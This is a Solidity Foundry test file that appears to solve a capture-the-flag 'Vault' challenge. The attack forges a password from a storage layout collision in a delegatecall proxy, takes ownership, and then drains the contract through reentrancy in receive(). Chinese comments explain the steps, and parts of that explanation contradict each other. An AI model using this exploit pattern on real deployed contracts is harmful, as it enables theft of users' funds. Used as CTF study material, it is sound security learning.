// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address player = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(player, 1 ether);
        vm.startPrank(player);

        // add your hacker code.
        bytes32 fakePassword = bytes32(uint256(uint160(address(logic)))); 
        // (bool success, ) = address(vault).delegatecall(
        (bool success, ) = address(vault).call(
            abi.encodeWithSignature(
                "changeOwner(bytes32,address)",
                fakePassword,
                player
            )
        );
        console.log(vault.owner(), vault.owner());
        require(success, "delegatecall failed");

        console.log("Vault owner changed to player", success);

        // 2. 检查 Vault 合约的 owner 是否已经改变
        console.log(logic.owner());
        console.log(vault.owner());
        assertEq(vault.owner(), player, "owner not changed");

        // 2. 作为新所有者，启用提取功能
        vault.openWithdraw();
        vm.stopPrank();
        // 3. 检查余额
        console.log(address(vault).balance, "balance");
        assertEq(address(vault).balance, 0.1 ether, "balance not correct");
        // 设法取出预先部署的 Vault 合约内的所有资金。
        // 4. VaultExploiter 合约首先存款
        vault.deposite{value: 0.1 ether}();
        assertEq(address(vault).balance, 0.2 ether, "balance not correct");

        // 3. 从 Vault 合约中提取存款
        vault.withdraw();
        assertEq(
            address(vault).balance,
            0 ether,
            "withdraw balance not correct"
        );

        require(vault.isSolve(), "solved");
    }

    receive() external payable {
        console.log("receive", msg.sender, address(vault), address(this));
        vault.withdraw();
    }
}

/**
 * 
攻击者利用 delegatecall 修改 Vault 合约的所有者。
作为新所有者，启用提取功能。
触发 receive() 函数中的重入攻击，从而提取所有的资金。

 * 因为 withdraw 方法 使用了 call 方法了进行转账，所以可以调用 receive 方法进行攻击
 * 因为 withdraw 方法中 call 方法的调用是在 deposites 的修改之前，所以可以不断的调用 receive 方法进行攻击
 * 
 * withdraw() 函数中在资金转账后更新 deposites[msg.sender]。
 * 如果攻击者在转账过程中通过重入调用 withdraw()，它们可以反复调用 withdraw() 来提取资金，
 * 因为 deposites[msg.sender] 还未被更新为零。因此，如果不处理重入攻击，它可能只能取出部分资金。
 * 
 * 完整的重入攻击步骤
利用 delegatecall：攻击者伪造密码，通过 delegatecall 直接调用 changeOwner 函数，将 Vault 合约的 owner 更改为攻击者地址。

启用提取功能：攻击者作为新的所有者，调用 openWithdraw() 启用提款功能。

进行重入攻击：通过 receive() 函数触发重入攻击，在提取资金的过程中多次调用 withdraw()，直到提取完所有资金。由于 deposites[msg.sender] 在第一次调用后被设置为零，攻击者可以多次提取相同金额的资金。


 */